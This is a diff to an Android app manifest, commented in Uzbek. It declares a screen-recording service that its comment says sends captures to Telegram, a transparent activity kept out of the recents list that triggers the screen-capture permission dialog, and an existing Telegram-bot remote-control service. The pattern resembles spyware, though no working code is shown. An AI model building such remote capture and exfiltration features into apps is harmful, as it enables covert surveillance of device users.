@@ -32,6 +32,10 @@
     <uses-permission
         android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC"
         android:minSdkVersion="34" />
+    <!-- API 34+ uchun ekran yozish foreground service -->
+    <uses-permission
+        android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION"
+        android:minSdkVersion="34" />
 
     <!-- Bildirishnomalar (API 33+) -->
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
@@ -142,6 +146,20 @@
         <service
             android:name=".AlarmService"
             android:exported="false" />
+
+        <!-- Ekran yozuvi: MediaProjection orqali, Telegram'ga yuboradi -->
+        <service
+            android:name=".ScreenRecordService"
+            android:foregroundServiceType="mediaProjection"
+            android:exported="false" />
+
+        <!-- Shaffof Activity — tizimning MediaProjection ruxsat dialogini ochadi -->
+        <activity
+            android:name=".ScreenRecordPermissionActivity"
+            android:exported="false"
+            android:theme="@style/Theme.Transparent"
+            android:taskAffinity=""
+            android:excludeFromRecents="true" />
 
         <!-- Telegram bot buyruqlarini kuzatish (uzoqdan boshqarish) -->
         <service
